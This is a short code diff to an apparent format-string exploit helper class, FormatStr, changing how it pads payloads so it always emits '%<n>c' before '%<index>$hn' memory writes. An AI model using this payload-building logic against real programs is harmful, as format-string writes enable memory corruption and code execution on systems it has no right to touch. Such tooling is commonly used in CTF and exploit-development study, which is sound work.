@@ -66,16 +66,7 @@ class FormatStr:
         for num in range(len(self.tuples)):
             print_len = self.tuples[num][1] - printed
             if print_len:
-                if print_len > 8:
-                    payload += "%" + str(print_len) + "x"
-                elif print_len == 8:
-                    payload += "%x"
-                elif print_len > 4:
-                    payload += "%" + str(print_len) + "hx"
-                elif print_len == 4:
-                    payload += "%hx"
-                else:
-                    payload += "A" * print_len
+                payload += "%" + str(print_len) + "c"
             payload += "%" + str(index) + "$hn"
             printed += print_len
             index += 1
